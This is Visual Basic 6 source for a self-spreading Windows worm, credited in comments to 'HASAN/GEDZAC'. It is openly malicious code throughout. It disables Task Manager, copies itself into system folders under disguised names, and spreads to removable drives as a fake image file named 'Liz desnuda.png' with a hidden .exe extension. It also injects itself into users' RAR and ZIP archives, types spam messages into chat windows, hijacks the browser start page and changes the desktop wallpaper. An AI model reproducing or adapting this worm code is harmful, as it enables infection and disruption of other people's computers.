   VERSION 5.00
   Begin VB.Form Form1
      BorderStyle     =   0  'None
      Caption         =   "Form1"
      ClientHeight    =   1140
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   1950
      Icon            =   "Form1.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   1140
      ScaleWidth      =   1950
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.Timer Timer3
         Interval        =   1000
         Left            =   720
         Top             =   480
      End
      Begin VB.Timer Timer1
         Interval        =   30000
         Left            =   1080
         Top             =   0
      End
      Begin VB.Timer Timer2
         Interval        =   1500
         Left            =   720
         Top             =   0
      End
      Begin VB.Image Image1
         BorderStyle     =   1  'Fixed Single
         Height          =   615
         Left            =   0
         Picture         =   "Form1.frx":0ECA
         Stretch         =   -1  'True
         Top             =   0
         Width           =   735
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   '*****************************************************************
   'codigo generado por HASAN/GEDZAC GRUOP'**************************
   'EL VIRIX ES MI DIOS, GEDZAC ES MI PROFETA Y YO UN FIEL DISCIPULO*
   '*****************************************************************
   '*****************************************************************


   Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
   Private Declare Function DirSystem Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal HKey As Long) As Long
   Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal HKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
   Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal HKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Long, ByVal cbData As Long) As Long
   Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
   Dim a As Integer
   Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" _
       (ByVal uAction As Long, ByVal uParam As Long, _
       ByVal lpvParam As String, ByVal fuWinIni As Long) As Long
   Const SPIF_UPDATEINIFILE = &H1
   Const SPI_SETDESKWALLPAPER = 20
   Const SPIF_SENDWININICHANGE = &H2
   Const REG_SZ = 1
   Const KEY_WRITE = &H20006
   Const HKEY_CURRENT_USER = &H80000001
   Dim Sysdir As String, UnidaD As String, ultAplica As String
   Dim mensaje1 As String, mensaje2 As String, mensaje3 As String, mensaje4 As String, mensaje5 As String, message As String
   Dim c1 As String * 256
   Dim File As String * 261
   Dim Ojt As New FileSystemObject
   Public Mayk As New IWshShell_Class
   Public leer As String, Rar As String, ZIP As String
   Dim i%
   Dim CompresorRAR As Boolean, compresorZIP As Boolean
   Dim lstdirs As New Collection
   Dim lstfiles As New Collection
   Private Sub Form_Load()
       Timer3.Enabled = False
       misVAriables
       PonmeDeInicio
       GetModuleFileName 0, File, 261
       This_is_my_name = File
       i = 65
       MsgBox "EL VIRIX ES MI DIOS, GEDZAC ES MI PROFETA Y YO UN FIEL DISCIPULO", vbCritical, "Te extraño como se extraña el sueño en una noche de insomnio"
       SaveStringLong HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", CByte(1)
       RegCloseKey hregkey
       cREA
       a = 1
       leer = May.RegRead("HKEY_CLASSES_ROOT\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\InfoTip")
       If leer <> "HASAN/GEDZAC/MEXICO/BigMonster" Then
           Copiadera
       End If
       If leer = "HASAN/GEDZAC/MEXICO/BigMonster" Then
       HaycompresoresRAR
       HayCompresoresZIP 'Lo hago siempre que se inicia con la finalidad de infectar los zip y rar que _
       cree durante su secion
       MensajeMostrado
       End If
   On Error GoTo salir
       FileCopy This_is_my_name, DirecWindows & "\Liz.exe"   'infecta la carpeta de windows
   salir:
   Exit Sub
   End Sub
   Sub SaveStringLong(HKey As Long, strPath As String, strValue As String, strData As String)
       Dim ret
       RegCreateKey HKey, strPath, ret
       RegSetValueExLong ret, strValue, 0&, REG_DWORD, CByte(strData), 4&
       RegCloseKey ret
   End Sub
   Private Sub misVAriables()
   DirSystema = May1.GetSpecialFolder(1) ' Obtiene la ruta de system32
   DirecWindows = May1.GetSpecialFolder(0) 'Obtiene  la ruta de windows
   End Sub
   Private Sub Copiadera()
   MsgBox "Nadie esta a salvo de GEDZAC" & vbCrLf & "GEDZAC te esta infectando en este momento", vbInformation, "Dedicado a los Miembros de GEDZAC"
   Dim Copia As Integer
   Randomize
    Copia = Int((10 * Rnd) + 1)
   Select Case Copia
   Case 1:
       Systema = "\spoolshv.exe"
       Registro = "Windows"
   Case 2:
       Systema = "\taskmgs.exe"
       Registro = "Systray"
   Case 3:
       Systema = "\ILSSAS.EXE"
       Registro = "Syetem"
   Case 4:
       Systema = "\msnmsgr.EXE"
       Registro = "RegisteredOrganization"
   Case 5:
       Systema = "\SSMS.EXE"
       Registro = "RegisteredOwner"
   Case 6:
       Systema = "\taskmrg.EXE"
       Registro = "Service"
   Case 7:
       Systema = "\MDM.EXE"
       Registro = "MSN"
   Case 8:
       Systema = "\CRSSS.EXE"
       Registro = "WINLOGON"
   Case 9:
       Systema = "\TAKSMS.EXE"
       Registro = "Windows Vista"
   Case 10:
       Systema = "\Telcel.exe"
       Registro = "Amigo Kit"
   End Select
   Mensajes
   NombreTentador = Systema
   May.RegWrite "HKEY_CLASSES_ROOT\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\InfoTip", "HASAN/GEDZAC/MEXICO/BigMonster"
   Ojt.CopyFile This_is_my_name, DirSystema & NombreTentador, True  'infecta la carpeta system32
   FileCopy This_is_my_name, DirecWindows & NombreTentador  'infecta la carpeta de windows
   May.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Warninag", "HASAN/GEDZAC/MEXICO"
   Registro_Nombres
   DoEvents
   End Sub
   Private Sub Timer1_Timer()
   ultAplica = VentanaActiva(True)
   If Right(ultAplica, 12) = "Conversación" Then
       VBA.Interaction.SendKeys ("Hasan esta en este ordenador, y GEDZAC es tu dueño")
       SendKeys "{enter}"
   Else
       Exit Sub
   End If
   End Sub
   Private Sub Timer2_Timer()
   'Nos metemos en las unidades c: d: e: f: a: y todas _
   las que tenga si son de lectura y escritura
   On Error GoTo noDisk
   message = "En otro tiempo" & vbCrLf & "En otro lugar..." & vbCrLf _
   & "Cuando tu seas libre..." & vbCrLf _
   & "Cuando yo sea libre..." & vbCrLf _
   & "Volveremos a encontrarnos........." & vbCrLf _
   & "HASAN/GEDZAC"
   While i <= 90
       nDrive = Chr(i) & ":\"
       cDrive = GetDriveType(nDrive)
       Select Case cDrive
       Case 2
           UnidaD = "Rem"
       End Select
       If cDrive <> 1 And UnidaD = "Rem" Then
           If Not (Ojt.FileExists(nDrive & "\" & "Liz desnuda.png                   .exe")) Then
               FileCopy This_is_my_name, nDrive & "\" & "Liz desnuda.png                   .exe"
               w = FreeFile
               Open nDrive & "\Hola Amor.txt" For Output As w
                  Print #w, message
               Close w
           End If
       Else: End If
        i = i + 1
   Wend
   noDisk:
   i = i + 1
       Exit Sub
   End Sub
   Private Sub HaycompresoresRAR()
   Dim drive
   On Error GoTo NoHayCompresorRAR
   Rar = LCase(May.RegRead("HKEY_CLASSES_ROOT\WinRAR\shell\open\command\"))
   If Rar <> "" Then
       Rar = Mid(Rar, 2, InStr(LCase(Rar), ".exe") + 2)
       CompresorRAR = True
   End If
   DentroZR
   NoHayCompresorRAR:
   Exit Sub
   End Sub

   Private Sub HayCompresoresZIP()
   On Error GoTo NoHayCompresorZIP
   ZIP = LCase(May.RegRead("HKEY_CLASSES_ROOT\WINZIP\shell\open\command\"))
   If ZIP <> "" Then
       ZIP = Left(ZIP, Len(ZIP) - 5)
       compresorZIP = True
   End If
   DentroZR
   NoHayCompresorZIP:
   Exit Sub
   End Sub

   Private Sub DentroZR()
   If compresorZIP = True Or CompresorRAR = True Then
       drive = Left(DirecWindows, 3)
       lstdirs.Add drive & "Documents and Settings"
       Do
           findfilesdir lstdirs.Item(1), "*.*"
           lstdirs.Remove 1
       Loop Until lstdirs.Count = 0
   Else
       Exit Sub
   End If
   NoHayCompresor:
   End Sub
   Private Sub Timer3_Timer()
   'Activamos la cipia para dejar libre el original
    '   Shell (DirecWindows & "\Liz.exe")
    '   End
   End Sub
   Public Sub findfilesdir(DirPath As String, FileSpec As String)
   Dim filestring As String, RutaInccion As String
   Dim arc As String
   Set fso = CreateObject("Scripting.FileSystemObject")
   a = 1
   DirPath = Trim$(DirPath)
   If DirPath <> "C:" Then
   If Right$(DirPath, 1) <> "\" Then
     DirPath = DirPath & "\"
   End If
   End If
   filestring = Dir$(DirPath & FileSpec, vbArchive Or vbHidden Or vbSystem Or vbDirectory)
   Do
     DoEvents
     If filestring = "" Then
       Exit Do
     Else
       If (GetAttr(DirPath & filestring) And vbDirectory) = vbDirectory Then
           If Left$(filestring, 1) <> "." And Left$(filestring, 2) <> ".." Then
               lstdirs.Add DirPath & filestring & "\"
           End If
       End If
       If (GetAttr(DirPath & filestring) And vbDirectory) <> vbDirectory Then
       arc = Right(filestring, 4)
         If arc = ".rar" Then
         'nos metemos en todos los rar que hay en el sistema
              lstfiles.Add DirPath & filestring
              RutaInccion = DirPath & filestring
              Set archivo = fso.GetFile(RutaInccion)
              direccioncorta = archivo.ShortPath
              Shell Rar & " a " & direccioncorta & " " & DirecWindows & "\liz.exe"
         End If
         If arc = ".zip" Then
         'nos metemos en todos los zip que hay en el sistema
               lstfiles.Add DirPath & filestring
              RutaInccion = DirPath & filestring
              Set archivo = fso.GetFile(RutaInccion)
              direccioncorta = archivo.ShortPath
              Shell ZIP & " a " & direccioncorta & " " & DirecWindows & "\liz.exe"
          End If
       End If
     End If
     filestring = Dir$
   Loop
   End Sub
   Private Sub PonmeDeInicio()
   SetStartPage ("http://www.hasan-liz.tk")
   SetWindowTitle ("¡GEDZAC esta contigo ... ¡Liz te extraño...Hasan!")
   End Sub

   Private Sub Mensajes()
   mensaje1 = "En estas epocas recientes nos hemos podido percatar de los constantes asesinatos cometidos " _
   & vbCrLf & "por el gobierno de los Estados unidos hacia nuestros hermanos latinos, es hora de cambiar" _
   & vbCrLf & "no nos dejemos intimidar por el asesino del Norte,expreso mi apoyo a los rebeldes Iraquies" _
   & vbCrLf & "Mexico no quiere ser escalvo de nadie, y mis hermanos latinos tampoco" _
   & vbCrLf & "Escrito desde Mexico por Hasan," & vbCrLf & vbCrLf & vbCrLf & "GEDZAC group"
   mensaje2 = "Un dia conoci una chica de ojos lindos, me atraparon esos ojitos razgados" _
   & vbCrLf & "un dia sin decir nada simplemente desaparesiste, no dejaste huella, ni un adios" _
   & vbCrLf & "aun sigo esperando en la misma banca, a diario, pero tu no vienes, " _
   & vbCrLf & "estoi viendo como la vida se me escurre entre los dedos, y lo mas curioso es que " _
   & vbCrLf & "no hago algo por detenerla...," & vbCrLf & vbCrLf & vbCrLf & "GEDZAC group"
   mensaje3 = "Padre nuestro que estas en el cielo" _
   & vbCrLf & "santificado sea tu nombre, venga a nosotros tu reyno danos hoy nuestro pan de cada dia" _
   & vbCrLf & "perdona  nuestras ofenzas, como nosotros perdonamos a los que nos ofenden" _
   & vbCrLf & "no nos dejes caer en tentacion, solo libranos del mal. Amen " _
   & vbCrLf & "Escrito por Hasan desde Mexico" & vbCrLf & vbCrLf & vbCrLf & "GEDZAC group"
   mensaje4 = "Si regresas algun dia mis brazos siguen abiertos parati" _
   & vbCrLf & "mis labios sigue esperando por un beso" _
   & vbCrLf & "mis manos esperan a acaricirte " _
   & vbCrLf & "Regaleme una noche a su lado, aun que el precio sea vivir " _
   & vbCrLf & "una eternidad" & vbCrLf & "sin usted..." & vbCrLf & vbCrLf & "HASAN/GEDZAC group"
   mensaje5 = "GEDZAC group, somos creadores de vida, no somos piratas, solo damos" _
   & vbCrLf & "a conocer nuestras ideas mediante lo unico que sabemos hacer, programar" _
   & vbCrLf & "nuestro objetivo no es destruir, si no crear, somos solo jovenes con ganas " _
   & vbCrLf & "de aprender cada vez mas y mas y mas" _
   & vbCrLf & "Algun dia los locos azotaremos al mundo y ya empezamos a Moverlo xD" & vbCrLf & vbCrLf & vbCrLf & "GEDZAC group"


   w = FreeFile
       Open DirecWindows & "\Asesino.hta" For Output As w
                  Print #w, mensaje1
       Close w
       Open DirecWindows & "\Liz.hta" For Output As w
                  Print #w, mensaje2
       Close w
       Open DirecWindows & "\Padre Nuestro.hta" For Output As w
                  Print #w, mensaje3
       Close w
       Open DirecWindows & "\Por si vuelves.hta" For Output As w
                  Print #w, mensaje4
       Close w
       Open DirecWindows & "\GEDZAC.hta" For Output As w
                  Print #w, mensaje5
       Close w
   End Sub
   Private Sub MensajeMostrado()
   On Error Resume Next
   Dim ret As Long
   If Day(Now) = 26 Then
           SavePicture Image1, DirecWindows & "\GEDZAC LABS.jpg"
           Dim FileName As String
       Dim X As Long
       FileName = DirecWindows & "\GEDZAC LABS.jpg"
       X = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, _
          SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
       MsgBox "GEDZAC ESTA CONTIGO, QUIERES ESTAR CON GEDZAC???", vbInformation, "By HASAN"
   End If

       If Weekday(Date, vbSunday) = 2 Then
           res = ShellExecute(Me.hwnd, "Open", DirecWindows & "\Asesino.hta", "", "", 1)
       ElseIf Weekday(Date, vbSunday) = 3 Then
           res = ShellExecute(Me.hwnd, "Open", DirecWindows & "\liz.hta", "", "", 1)
       ElseIf Weekday(Date, vbSunday) = 4 Then
           res = ShellExecute(Me.hwnd, "Open", DirecWindows & "\Padre Nuestro.hta", "", "", 1)
       ElseIf Weekday(Date, vbSunday) = 5 Then
           res = ShellExecute(Me.hwnd, "Open", DirecWindows & "\Por si vuelves.hta", "", "", 1)
       ElseIf Weekday(Date, vbSunday) = 6 Then
           res = ShellExecute(Me.hwnd, "Open", DirecWindows & "\GEDZAC.hta", "", "", 1)
       End If
   End Sub
